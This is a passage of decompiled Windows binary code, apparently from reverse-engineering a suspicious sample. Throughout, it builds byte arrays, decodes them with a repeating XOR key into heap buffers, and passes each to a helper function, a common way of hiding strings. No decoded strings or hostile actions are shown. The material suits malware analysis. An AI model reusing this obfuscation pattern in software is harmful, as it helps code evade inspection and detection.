0x2f;\n    var_18h._1_1_ = 0x5b;\n    var_18h._2_1_ = 0x2a;\n    var_18h._3_1_ = 0x18;\n    var_14h._0_1_ = 0x2a;\n    var_14h._1_1_ = 0x34;\n    var_14h._2_1_ = 0x2f;\n    var_14h._3_1_ = 0x50;\n    var_10h._0_1_ = 0x2c;\n    var_10h._1_1_ = 3;\n    var_10h._2_1_ = 0x21;\n    var_10h._3_1_ = 1;\n    var_ch._0_1_ = 0x1c;\n    var_ch._1_1_ = 0x41;\n    var_ch._2_1_ = 0x2a;\n    var_ch._3_1_ = 0;\n    var_8h._0_1_ = 0x26;\n    var_8h._1_1_ = 0x19;\n    var_8h._2_1_ = 0x29;\n    var_8h._3_1_ = 0x54;\n    var_4h = 0x26;\n    var_3h = 0x76;\n    var_28h = 0x754f7643;\n    var_24h._0_2_ = 0x334c;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1b);\n    var_78h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar6 = 0;\n    do {\n        puVar1 = iVar6 + var_78h;\n        iVar7 = iVar6 % var_38h;\n        iVar6 = iVar6 + 1;\n        *puVar1 = *(&var_28h + iVar7) ^ puVar1[&var_1ch - var_78h];\n    } while (iVar6 < 0x1a);\n    fcn.00407d6f();\n    var_10h._0_1_ = 0x16;\n    var_10h._1_1_ = 0x34;\n    var_10h._2_1_ = 99;\n    var_10h._3_1_ = 0xf;\n    var_ch._0_1_ = 0x2f;\n    var_ch._1_1_ = 0x11;\n    var_ch._2_1_ = 0x37;\n    var_ch._3_1_ = 0x38;\n    var_8h._0_1_ = 0x41;\n    var_8h._1_1_ = 5;\n    var_8h._2_1_ = 0x21;\n    var_8h._3_1_ = 0x24;\n    var_4h = 0x22;\n    var_3h = 0x34;\n    var_2h = 0x37;\n    var_28h = 0x6c375145;\n    var_24h._0_2_ = 0x414d;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar7 = 0;\n    do {\n        puVar1 = iVar7 + iVar6;\n        iVar8 = iVar7 % var_38h;\n        iVar7 = iVar7 + 1;\n        *puVar1 = *(&var_28h + iVar8) ^ puVar1[&var_10h - iVar6];\n    } while (iVar7 < 0xf);\n    fcn.00407d6f();\n    var_14h._0_1_ = 0x38;\n    var_14h._1_1_ = 0x53;\n    var_14h._2_1_ = 0x34;\n    var_14h._3_1_ = 0x14;\n    var_10h._0_1_ = 0x35;\n    var_10h._1_1_ = 0x1e;\n    var_10h._2_1_ = 0x44;\n    var_10h._3_1_ = 0xe;\n    var_ch._0_1_ = 5;\n    var_ch._1_1_ = 0x2f;\n    var_ch._2_1_ = 0x3b;\n    var_ch._3_1_ = 0x44;\n    var_8h._0_1_ = 0xe;\n    var_8h._1_1_ = 7;\n    var_8h._2_1_ = 0x3f;\n    var_8h._3_1_ = 7;\n    var_4h = 0x53;\n    var_3h = 0;\n    var_2h = 0x14;\n    var_1h = 0x56;\n    var_68h = 0x7167366b;\n    var_64h._0_1_ = 0x56;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + iVar7;\n        iVar9 = iVar8 % var_34h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_68h + iVar9) ^ puVar1[&var_14h - iVar7];\n    } while (iVar8 < 0x14);\n    fcn.00407d6f();\n    var_1ch._0_1_ = 0x1b;\n    var_1ch._1_1_ = 0x5d;\n    var_1ch._2_1_ = 0x24;\n    var_1ch._3_1_ = 0x33;\n    var_18h._0_1_ = 0x25;\n    var_18h._1_1_ = 0x2d;\n    var_18h._2_1_ = 0x77;\n    var_18h._3_1_ = 7;\n    var_14h._0_1_ = 0x3c;\n    var_14h._1_1_ = 0x2b;\n    var_14h._2_1_ = 0x3a;\n    var_14h._3_1_ = 0x4b;\n    var_10h._0_1_ = 0x18;\n    var_10h._1_1_ = 0x3b;\n    var_10h._2_1_ = 0x3e;\n    var_10h._3_1_ = 0x18;\n    var_ch._0_1_ = 0x4a;\n    var_ch._1_1_ = 0x19;\n    var_ch._2_1_ = 0x24;\n    var_ch._3_1_ = 0x27;\n    var_8h._0_1_ = 0x24;\n    var_8h._1_1_ = 0x5d;\n    var_8h._2_1_ = 0x17;\n    var_8h._3_1_ = 0x37;\n    var_4h = 0x4e;\n    var_50h = 0x52703848;\n    var_4ch._0_1_ = 0x4e;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n    var_68h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_68h;\n        iVar9 = iVar8 % var_34h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_50h + iVar9) ^ puVar1[&var_1ch - var_68h];\n    } while (iVar8 < 0x19);\n    fcn.00407d6f();\n    var_18h._0_1_ = 0x31;\n    var_18h._1_1_ = 0xd;\n    var_18h._2_1_ = 10;\n    var_18h._3_1_ = 0x38;\n    var_14h._0_1_ = 10;\n    var_14h._1_1_ = 0x15;\n    var_14h._2_1_ = 0x26;\n    var_14h._3_1_ = 0x1a;\n    var_10h._0_1_ = 0x2f;\n    var_10h._1_1_ = 0x21;\n    var_10h._2_1_ = 0xe;\n    var_10h._3_1_ = 3;\n    var_ch._0_1_ = 0x32;\n    var_ch._1_1_ = 0x1a;\n    var_ch._2_1_ = 0x2f;\n    var_ch._3_1_ = 0x21;\n    var_8h._0_1_ = 2;\n    var_8h._1_1_ = 0x1d;\n    var_8h._2_1_ = 7;\n    var_8h._3_1_ = 0xf;\n    var_4h = 0x23;\n    var_3h = 0x57;\n    var_28h = 0x57466862;\n    var_24h._0_2_ = 0x716b;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x17);\n    var_50h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_50h;\n        iVar9 = iVar8 % var_38h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_28h + iVar9) ^ puVar1[&var_18h - var_50h];\n    } while (iVar8 < 0x16);\n    fcn.00407d6f();\n    var_1ch._0_1_ = 0x1f;\n    var_1ch._1_1_ = 0x2f;\n    var_1ch._2_1_ = 0x21;\n    var_1ch._3_1_ = 0x15;\n    var_18h._0_1_ = 0x10;\n    var_18h._1_1_ = 0x47;\n    var_18h._2_1_ = 0x29;\n    var_18h._3_1_ = 0x27;\n    var_14h._0_1_ = 0x22;\n    var_14h._1_1_ = 0x1e;\n    var_14h._2_1_ = 0xc;\n    var_14h._3_1_ = 0x55;\n    var_10h._0_1_ = 0x25;\n    var_10h._1_1_ = 0x26;\n    var_10h._2_1_ = 0x17;\n    var_10h._3_1_ = 0x3c;\n    var_ch._0_1_ = 0x11;\n    var_ch._1_1_ = 0x5a;\n    var_ch._2_1_ = 0x3a;\n    var_ch._3_1_ = 0x23;\n    var_8h._0_1_ = 0x1e;\n    var_8h._1_1_ = 9;\n    var_8h._2_1_ = 4;\n    var_8h._3_1_ = 0x56;\n    var_4h = 0x4c;\n    var_28h = 0x6c724a4c;\n    var_24h._0_2_ = 0x3363;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar9 = 0;\n    do {\n        puVar1 = iVar9 + iVar8;\n        iVar10 = iVar9 % var_38h;\n        iVar9 = iVar9 + 1;\n        *puVar1 = *(&var_28h + iVar10) ^ puVar1[&var_1ch - iVar8];\n    } while (iVar9 < 0x19);\n    fcn.00407d6f();\n    var_18h._0_1_ = 0;\n    var_18h._1_1_ = 0x54;\n    var_18h._2_1_ = 0x3f;\n    var_18h._3_1_ = 0x2f;\n    var_14h._0_1_ = 0x1a;\n    var_14h._1_1_ = 0x36;\n    var_14h._2_1_ = 0x36;\n    var_14h._3_1_ = 0x5c;\n    var_10h._0_1_ = 0x18;\n    var_10h._1_1_ = 0x3f;\n    var_10h._2_1_ = 4;\n    var_10h._3_1_ = 0x27;\n    var_ch._0_1_ = 3;\n    var_ch._1_1_ = 0x43;\n    var_ch._2_1_ = 5;\n    var_ch._3_1_ = 0x20;\n    var_8h._0_1_ = 0;\n    var_8h._1_1_ = 0x2e;\n    var_8h._2_1_ = 0x36;\n    var_8h._3_1_ = 0x56;\n    var_4h = 9;\n    var_3h = 0x56;\n    var_28h = 0x566c3153;\n    var_24h._0_2_ = 0x4269;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x17);\n    iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar10 = 0;\n    do {\n        puVar1 = iVar10 + iVar9;\n        iVar11 = iVar10 % var_38h;\n        iVar10 = iVar10 + 1;\n        *puVar1 = *(&var_28h + iVar11) ^ puVar1[&var_18h - iVar9];\n    } while (iVar10 < 0x16);\n    fcn.00407d6f();\n    var_20h = 0x2a685c02;\n    var_1ch._0_1_ = 0x2e;\n    var_1ch._1_1_ = 0x37;\n    var_1ch._2_1_ = 0x50;\n    var_1ch._3_1_ = 0x54;\n    var_18h._0_1_ = 0x3d;\n    var_18h._1_1_ = 0x12;\n    var_18h._2_1_ = 0x38;\n    var_18h._3_1_ = 0x57;\n    var_14h._0_1_ = 0x5f;\n    var_14h._1_1_ = 0x34;\n    var_14h._2_1_ = 0x24;\n    var_14h._3_1_ = 1;\n    var_10h._0_1_ = 0x4b;\n    var_10h._1_1_ = 0x57;\n    var_10h._2_1_ = 0x3b;\n    var_10h._3_1_ = 0x24;\n    var_ch._0_1_ = 0x22;\n    var_ch._1_1_ = 0x4a;\n    var_ch._2_1_ = 0x68;\n    var_ch._3_1_ = 0x2a;\n    var_8h._0_1_ = 0x28;\n    var_8h._1_1_ = 0x27;\n    var_8h._2_1_ = 0x50;\n    var_8h._3_1_ = 0x54;\n    var_4h = 0x3d;\n    var_3h = 0x26;\n    var_2h = 0x34;\n    var_1h = 0x39;\n    var_40h = 0x58383951;\n    var_3ch._0_1_ = 0x41;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar11 = 0;\n    do {\n        puVar1 = iVar11 + iVar10;\n        iVar12 = iVar11 % var_34h;\n        iVar11 = iVar11 + 1;\n        *puVar1 = *(&var_40h + iVar12) ^ puVar1[&var_20h - iVar10];\n    } while (iVar11 < 0x20);\n    fcn.00407d6f();\n    var_20h = 0x1c710862;\n    var_1ch._0_1_ = 1;\n    var_1ch._1_1_ = 2;\n    var_1ch._2_1_ = 0x54;\n    var_1ch._3_1_ = 0xc;\n    var_18h._0_1_ = 0x4b;\n    var_18h._1_1_ = 0x17;\n    var_18h._2_1_ = 0x20;\n    var_18h._3_1_ = 0x11;\n    var_14h._0_1_ = 0x42;\n    var_14h._1_1_ = 8;\n    var_14h._2_1_ = 0x68;\n    var_14h._3_1_ = 0;\n    var_10h._0_1_ = 0xb;\n    var_10h._1_1_ = 0x1f;\n    var_10h._2_1_ = 0x43;\n    var_10h._3_1_ = 4;\n    var_ch._0_1_ = 0x4c;\n    var_ch._1_1_ = 0xb;\n    var_ch._2_1_ = 0x32;\n    var_ch._3_1_ = 2;\n    var_8h._0_1_ = 0x58;\n    var_8h._1_1_ = 0x1b;\n    var_8h._2_1_ = 0x51;\n    var_8h._3_1_ = 0x1e;\n    var_4h = 7;\n    var_3h = 0x17;\n    var_2h = 0x54;\n    var_1h = 0x6d;\n    var_28h = 0x72386d31;\n    var_24h._0_2_ = 0x7062;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    var_40h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar11 = 0;\n    do {\n        puVar1 = iVar11 + var_40h;\n        iVar12 = iVar11 % var_38h;\n        iVar11 = iVar11 + 1;\n        *puVar1 = *(&var_28h + iVar12) ^ puVar1[&var_20h - var_40h];\n    } while (iVar11 < 0x20);\n    fcn.00407d6f();\n    var_1ch._0_1_ = 0x11;\n    var_1ch._1_1_ = 0x52;\n    var_1ch._2_1_ = 4;\n    var_1ch._3_1_ = 5;\n    var_18h._0_1_ = 0x52;\n    var_18h._1_1_ = 0x23;\n    var_18h._2_1_ = 0x43;\n    var_18h._3_1_ = 0x22;\n    var_14h._0_1_ = 0x27;\n    var_14h._1_1_ = 0x56;\n    var_14h._2_1_ = 0x25;\n    var_14h._3_1_ = 0x52;\n    var_10h._0_1_ = 0x21;\n    var_10h._1_1_ = 0x1e;\n    var_10h._2_1_ = 0x5b;\n    var_10h._3_1_ = 0x27;\n    var_ch._0_1_ = 0x67;\n    var_ch._1_1_ = 0x35;\n    var_ch._2_1_ = 0x1e;\n    var_ch._3_1_ = 0x41;\n    var_8h._0_1_ = 0x2b;\n    var_8h._1_1_ = 0x5b;\n    var_8h._2_1_ = 0x22;\n    var_8h._3_1_ = 0x10;\n    var_4h = 0x52;\n    var_3h = 0x42;\n    var_c0h = 0x77473742;\n    var_bch._0_1_ = 0x37;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1b);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar12 = 0;\n    do {\n        puVar1 = iVar12 + iVar11;\n        iVar13 = iVar12 % var_34h;\n        iVar12 = iVar12 + 1;\n        *puVar1 = *(&var_c0h + iVar13) ^ puVar1[&var_1ch - iVar11];\n    } while (iVar12 < 0x1a);\n    fcn.00407d6f();\n    var_1ch._0_1_ = 0x60;\n    var_1ch._1_1_ = 0x2e;\n    var_1ch._2_1_ = 1;\n    var_1ch._3_1_ = 2;\n    var_18h._0_1_ = 0x3f;\n    var_18h._1_1_ = 0x29;\n    var_18h._2_1_ = 0x47;\n    var_18h._3_1_ = 0x2e;\n    var_14h._0_1_ = 0x12;\n    var_14h._1_1_ = 0x15;\n    var_14h._2_1_ = 0x28;\n    var_14h._3_1_ = 0x25;\n    var_10h._0_1_ = 0x52;\n    var_10h._1_1_ = 0x25;\n    var_10h._2_1_ = 0x27;\n    var_10h._3_1_ = 0x1e;\n    var_ch._0_1_ = 0x2e;\n    var_ch._1_1_ = 0x18;\n    var_ch._2_1_ = 0x41;\n    var_ch._3_1_ = 0x22;\n    var_8h._0_1_ = 0x34;\n    var_8h._1_1_ = 0x19;\n    var_8h._2_1_ = 0x36;\n    var_8h._3_1_ = 0x2d;\n    var_4h = 0x54;\n    var_3h = 0x2e;\n    var_2h = 0x42;\n    var_28h = 0x70424b33;\n    var_24h._0_2_ = 0x485a;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1c);\n    var_c0h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar12 = 0;\n    do {\n        puVar1 = iVar12 + var_c0h;\n        iVar13 = iVar12 % var_38h;\n        iVar12 = iVar12 + 1;\n        *puVar1 = *(&var_28h + iVar13) ^ puVar1[&var_1ch - var_c0h];\n    } while (iVar12 < 0x1b);\n    fcn.00407d6f();\n    var_14h._0_1_ = 0x24;\n    var_14h._1_1_ = 0x21;\n    var_14h._2_1_ = 0x74;\n    var_14h._3_1_ = 0x22;\n    var_10h._0_1_ = 0x54;\n    var_10h._1_1_ = 10;\n    var_10h._2_1_ = 2;\n    var_10h._3_1_ = 0x34;\n    var_ch._0_1_ = 0x66;\n    var_ch._1_1_ = 0x31;\n    var_ch._2_1_ = 0x5e;\n    var_ch._3_1_ = 0x17;\n    var_8h._0_1_ = 0x1e;\n    var_8h._1_1_ = 0x28;\n    var_8h._2_1_ = 0x53;\n    var_8h._3_1_ = 0x24;\n    var_4h = 0x52;\n    var_3h = 0x61;\n    var_28h = 0x43364477;\n    var_24h._0_2_ = 0x6137;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n    iVar12 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar13 = 0;\n    do {\n        puVar1 = iVar13 + iVar12;\n        iVar14 = iVar13 % var_38h;\n        iVar13 = iVar13 + 1;\n        *puVar1 = *(&var_28h + iVar14) ^ puVar1[&var_14h - iVar12];\n    } while (iVar13 < 0x12);\n    fcn.00407d6f();\n    var_14h._0_1_ = 0x22;\n    var_14h._1_1_ = 3;\n    var_14h._2_1_ = 0x23;\n    var_14h._3_1_ = 0x16;\n    var_10h._0_1_ = 0x1d;\n    var_10h._1_1_ = 5;\n    var_10h._2_1_ = 9;\n    var_10h._3_1_ = 3;\n    var_ch._0_1_ = 0x16;\n    var_ch._1_1_ = 0x3e;\n    var_ch._2_1_ = 3;\n    var_ch._3_1_ = 0xf;\n    var_8h._0_1_ = 7;\n    var_8h._1_1_ = 0x1a;\n    var_8h._2_1_ = 2;\n    var_8h._3_1_ = 0x14;\n    var_4h = 1;\n    var_3h = 0x14;\n    var_2h = 0x73;\n    var_b8h = 0x73716671;\n    var_b4h._0_1_ = 0x6e;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar13 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar14 = 0;\n    do {\n        puVar1 = iVar14 + iVar13;\n        iVar15 = iVar14 % var_34h;\n        iVar14 = iVar14 + 1;\n        *puVar1 = *(&var_b8h + iVar15) ^ puVar1[&var_14h - iVar13];\n    } while (iVar14 < 0x13);\n    fcn.00407d6f();\n    var_14h._0_1_ = 0x15;\n    var_14h._1_1_ = 6;\n    var_14h._2_1_ = 0x35;\n    var_14h._3_1_ = 0x26;\n    var_10h._0_1_ = 0x33;\n    var_10h._1_1_ = 0x32;\n    var_10h._2_1_ = 7;\n    var_10h._3_1_ = 9;\n    var_ch._0_1_ = 0x39;\n    var_ch._1_1_ = 0x28;\n    var_ch._2_1_ = 0x16;\n    var_ch._3_1_ = 0x11;\n    var_8h._0_1_ = 0xf;\n    var_8h._1_1_ = 0x38;\n    var_8h._2_1_ = 0x2f;\n    var_8h._3_1_ = 0x2a;\n    var_3h = 1;\n    var_2h = 0x2b;\n    var_1h = 0x46;\n    var_b0h = 0x4e666346;\n    var_ach._0_1_ = 0x46;\n    var_4h = var_14h._1_1_;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    var_b8h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar14 = 0;\n    do {\n        puVar1 = iVar14 + var_b8h;\n        iVar15 = iVar14 % var_34h;\n        iVar14 = iVar14 + 1;\n        *puVar1 = *(&var_b0h + iVar15) ^ puVar1[&var_14h - var_b8h];\n    } while (iVar14 < 0x14);\n    fcn.00407d6f();\n    var_14h._0_1_ = 0x22;\n    var_14h._1_1_ = 1;\n    var_14h._2_1_ = 0x25;\n    var_14h._3_1_ = 7;\n    var_10h._0_1_ = 10;\n    var_10h._1_1_ = 0x26;\n    var_10h._2_1_ = 0x16;\n    var_10h._3_1_ = 0x34;\n    var_ch._0_1_ = 0x13;\n    var_ch._1_1_ = 0xb;\n    var_ch._2_1_ = 0x1e;\n    var_ch._3_1_ = 0x3a;\n    var_8h._0_1_ = 0x1d;\n    var_8h._1_1_ = 1;\n    var_8h._2_1_ = 6;\n    var_8h._3_1_ = 7;\n    var_4h = 0x68;\n    var_28h = 0x62616471;\n    var_24h._0_2_ = 0x5368;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    var_b0h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar14 = 0;\n    do {\n        puVar1 = iVar14 + var_b0h;\n        iVar15 = iVar14 % var_38h;\n        iVar14 = iVar14 + 1;\n        *puVar1 = *(&var_28h + iVar15) ^ puVar1[&var_14h - var_b0h];\n    } while (iVar14 < 0x11);\n    fcn.00407d6f();\n    var_14h._0_1_ = 0x30;\n    var_14h._1_1_ = 0x53;\n    var_14h._2_1_ = 0x32;\n    var_14h._3_1_ = 0x22;\n    var_10h._0_1_ = 0x12;\n    var_10h._1_1_ = 0x2a;\n    var_10h._2_1_ = 0x17;\n    var_10h._3_1_ = 0x66;\n    var_ch._0_1_ = 1;\n    var_ch._1_1_ = 0x3e;\n    var_ch._2_1_ = 0;\n    var_ch._3_1_ = 0x2a;\n    var_8h._0_1_ = 0xf;\n    var_8h._1_1_ = 0x53;\n    var_8h._2_1_ = 0x14;\n    var_8h._3_1_ = 0x32;\n    var_4h = 0x76;\n    var_28h = 0x57733663;\n    var_24h._0_2_ = 0x4376;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    iVar14 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar15 = 0;\n    do {\n        puVar1 = iVar15 + iVar14;\n        iVar16 = iVar15 % var_38h;\n        iVar15 = iVar15 + 1;\n        *puVar1 = *(&var_28h + iVar16) ^ puVar1[&var_14h - iVar14];\n    } while (iVar15 < 0x11);\n    fcn.00407d6f();\n    var_20h = 0x38240302;\n    var_1ch._0_1_ = 0x1a;\n    var_1ch._1_1_ = 0x3f;\n    var_1ch._2_1_ = 0x34;\n    var_1ch._3_1_ = 0xb;\n    var_18h._0_1_ = 0x32;\n    var_18h._1_1_ = 0x2f;\n    var_18h._2_1_ = 0x1f;\n    var_18h._3_1_ = 0x22;\n    var_14h._0_1_ = 0x23;\n    var_14h._1_1_ = 9;\n    var_14h._2_1_ = 0x19;\n    var_14h._3_1_ = 0x2c;\n    var_10h._0_1_ = 0xc;\n    var_10h._1_1_ = 0x25;\n    var_10h._2_1_ = 0x25;\n    var_10h._3_1_ = 0x36;\n    var_ch._0_1_ = 5;\n    var_ch._1_1_ = 0x28;\n    var_ch._2_1_ = 0x1f;\n    var_ch._3_1_ = 0x22;\n    var_8h._0_1_ = 0x3d;\n    var_8h._1_1_ = 3;\n    var_8h._2_1_ = 0x10;\n    var_8h._3_1_ = 0x24;\n    var_4h = 0x69;\n    var_28h = 0x41776651;\n    var_24h._0_2_ = 0x4b69;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1e);\n    iVar15 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar16 = 0;\n    do {\n        puVar1 = iVar16 + iVar15;\n        iVar17 = iVar16 % var_38h;\n        iVar16 = iVar16 + 1;\n        *puVar1 = *(&var_28h + iVar17) ^ puVar1[&var_20h - iVar15];\n    } while (iVar16 < 0x1d);\n    fcn.00407d6f();\n    var_18h._0_1_ = 0x3c;\n    var_18h._1_1_ = 0x34;\n    var_18h._2_1_ = 7;\n    var_18h._3_1_ = 6;\n    var_14h._0_1_ = 4;\n    var_14h._1_1_ = 1;\n    var_14h._2_1_ = 0x36;\n    var_14h._3_1_ = 0x21;\n    var_10h._0_1_ = 0x20;\n    var_10h._1_1_ = 10;\n    var_10h._2_1_ = 0x1b;\n    var_10h._3_1_ = 0x38;\n    var_ch._0_1_ = 0x22;\n    var_ch._1_1_ = 0x17;\n    var_ch._2_1_ = 0x35;\n    var_ch._3_1_ = 0x1d;\n    var_8h._0_1_ = 0x38;\n    var_8h._1_1_ = 0x32;\n    var_8h._2_1_ = 7;\n    var_8h._3_1_ = 9;\n    var_4h = 10;\n    var_3h = 0x36;\n    var_2h = 0x21;\n    var_1h = 0x6e;\n    var_90h = 0x6e44516f;\n    var_8ch._0_1_ = 0x65;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    iVar16 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar17 = 0;\n    do {\n        puVar1 = iVar17 + iVar16;\n        iVar18 = iVar17 % var_34h;\n        iVar17 = iVar17 + 1;\n        *puVar1 = *(&var_90h + iVar18) ^ puVar1[&var_18h - iVar16];\n    } while (iVar17 < 0x18);\n    fcn.00407d6f();\n    var_1ch._0_1_ = 0x3d;\n    var_1ch._1_1_ = 0x13;\n    var_1ch._2_1_ = 2;\n    var_1ch._3_1_ = 0x2b;\n    var_18h._0_1_ = 0x3b;\n    var_18h._1_1_ = 1;\n    var_18h._2_1_ = 2;\n    var_18h._3_1_ = 0x35;\n    var_14h._0_1_ = 0x1d;\n    var_14h._1_1_ = 0x3e;\n    var_14h._2_1_ = 0x1b;\n    var_14h._3_1_ = 2;\n    var_10h._0_1_ = 0x34;\n    var_10h._1_1_ = 0x21;\n    var_10h._2_1_ = 0x21;\n    var_10h._3_1_ = 0;\n    var_ch._0_1_ = 0x26;\n    var_ch._1_1_ = 0x22;\n    var_ch._2_1_ = 0x27;\n    var_ch._3_1_ = 0x20;\n    var_8h._0_1_ = 7;\n    var_8h._1_1_ = 0x1a;\n    var_8h._2_1_ = 0x35;\n    var_8h._3_1_ = 0x29;\n    var_4h = 0x33;\n    var_3h = 0x6e;\n    var_88h = 0x4e50766e;\n    var_84h._0_1_ = 0x56;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1b);\n    var_90h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar17 = 0;\n    do {\n        puVar1 = iVar17 + var_90h;\n        iVar18 = iVar17 % var_34h;\n        iVar17 = iVar17 + 1;\n        *puVar1 = *(&var_88h + iVar18) ^ puVar1[&var_1ch - var_90h];\n    } while (iVar17 < 0x1a);\n    fcn.00407d6f();\n    var_14h._0_1_ = 0x2b;\n    var_14h._1_1_ = 1;\n    var_14h._2_1_ = 0x33;\n    var_14h._3_1_ = 0x1b;\n    var_10h._0_1_ = 0x1e;\n    var_10h._1_1_ = 0x17;\n    var_10h._2_1_ = 7;\n    var_10h._3_1_ = 0xd;\n    var_ch._0_1_ = 0x25;\n    var_ch._1_1_ = 8;\n    var_ch._2_1_ = 0x11;\n    var_ch._3_1_ = 0x12;\n    var_8h._0_1_ = 0xf;\n    var_8h._1_1_ = 0x19;\n    var_8h._2_1_ = 0x1f;\n    var_8h._3_1_ = 0x1f;\n    var_4h = 1;\n    var_3h = 0x66;\n    var_80h = 0x75666478;\n    var_7ch._0_1_ = 0x7a;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n    var_88h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar17 = 0;\n    do {\n        puVar1 = iVar17 + var_88h;\n        iVar18 = iVar17 % var_34h;\n        iVar17 = iVar17 + 1;\n        *puVar1 = *(&var_80h + iVar18) ^ puVar1[&var_14h - var_88h];\n    } while (iVar17 < 0x12);\n    fcn.00407d6f();\n    var_18h._0_1_ = 0x26;\n    var_18h._1_1_ = 9;\n    var_18h._2_1_ = 0x3e;\n    var_18h._3_1_ = 0x3d;\n    var_14h._0_1_ = 0x2b;\n    var_14h._1_1_ = 8;\n    var_14h._2_1_ = 0x34;\n    var_14h._3_1_ = 0xb;\n    var_10h._0_1_ = 8;\n    var_10h._1_1_ = 0x2a;\n    var_10h._2_1_ = 0x31;\n    var_10h._3_1_ = 0x3b;\n    var_ch._0_1_ = 7;\n    var_ch._1_1_ = 5;\n    var_ch._2_1_ = 0x1b;\n    var_ch._3_1_ = 0x2d;\n    var_8h._0_1_ = 0x29;\n    var_8h._1_1_ = 0xe;\n    var_8h._2_1_ = 0x12;\n    var_8h._3_1_ = 9;\n    var_4h = 0x6d;\n    var_28h = 0x446d6c75;\n    var_24h._0_2_ = 0x6b45;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x16);\n    var_80h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar17 = 0;\n    do {\n        puVar1 = iVar17 + var_80h;\n        iVar18 = iVar17 % var_38h;\n        iVar17 = iVar17 + 1;\n        *puVar1 = *(&var_28h + iVar18) ^ puVar1[&var_18h - var_80h];\n    } while (iVar17 < 0x15);\n    fcn.00407d6f();\n    var_1ch._0_1_ = 0x2a;\n    var_1ch._1_1_ = 0x3d;\n    var_1ch._2_1_ = 0x23;\n    var_1ch._3_1_ = 0x1f;\n    var_18h._0_1_ = 0x2f;\n    var_18h._1_1_ = 0x1b;\n    var_18h._2_1_ = 0x34;\n    var_18h._3_1_ = 3;\n    var_14h._0_1_ = 0x35;\n    var_14h._1_1_ = 0x2b;\n    var_14h._2_1_ = 0x15;\n    var_14h._3_1_ = 0x3d;\n    var_10h._0_1_ = 1;\n    var_10h._1_1_ = 0x10;\n    var_10h._2_1_ = 0x3a;\n    var_10h._3_1_ = 0x10;\n    var_ch._0_1_ = 0x37;\n    var_ch._1_1_ = 8;\n    var_ch._2_1_ = 0x21;\n    var_ch._3_1_ = 0x3c;\n    var_8h._0_1_ = 0x10;\n    var_8h._1_1_ = 0x2e;\n    var_8h._2_1_ = 0xf;\n    var_8h._3_1_ = 0x1d;\n    var_4h = 0x2b;\n    var_3h = 0x1e;\n    var_2h = 0x3d;\n    var_1h = 0x66;\n    var_70h = 0x71665879;\n    var_6ch._0_1_ = 0x4e;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1d);\n    iVar17 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar18 = 0;\n    do {\n        puVar1 = iVar18 + iVar17;\n        iVar19 = iVar18 % var_34h;\n        iVar18 = iVar18 + 1;\n        *puVar1 = *(&var_70h + iVar19) ^ 